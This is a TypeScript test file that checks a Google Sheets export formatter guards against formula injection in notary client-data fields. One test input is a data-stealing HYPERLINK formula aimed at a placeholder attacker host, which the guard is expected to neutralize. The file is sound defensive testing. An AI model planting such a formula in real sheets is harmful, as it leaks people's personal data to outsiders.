import { describe, expect, it } from "vitest";
import { fmtStr } from "@/lib/googleSheets/format";

// Sheets export writes with valueInputOption=USER_ENTERED (lib/googleSheets/
// client.ts), so a cell value starting with =, +, -, or @ is parsed as a
// live formula when the sheet is opened. CDD free-text fields (nama, alamat,
// catatan, ...) are notary-entered or OCR-suggested, so they must be treated
// as untrusted before reaching a Sheets cell.
describe("fmtStr — Google Sheets formula-injection guard", () => {
  it("passes ordinary strings through unchanged", () => {
    expect(fmtStr("Budi Santoso")).toBe("Budi Santoso");
    expect(fmtStr("Jl. Merdeka No. 1")).toBe("Jl. Merdeka No. 1");
  });

  it("neutralizes a leading = with a single-quote prefix", () => {
    expect(fmtStr('=HYPERLINK("http://evil.example/steal?x="&A1)')).toBe(
      '\'=HYPERLINK("http://evil.example/steal?x="&A1)'
    );
  });

  it("neutralizes leading +, -, and @ the same way", () => {
    expect(fmtStr("+1234")).toBe("'+1234");
    expect(fmtStr("-1234")).toBe("'-1234");
    expect(fmtStr("@SUM(A1:A9)")).toBe("'@SUM(A1:A9)");
  });

  it("does not touch a formula-trigger character that isn't in the first position", () => {
    expect(fmtStr("PT Maju=Jaya")).toBe("PT Maju=Jaya");
  });

  it("handles null/undefined the same as before (empty string, no crash)", () => {
    expect(fmtStr(null)).toBe("");
    expect(fmtStr(undefined)).toBe("");
  });
});
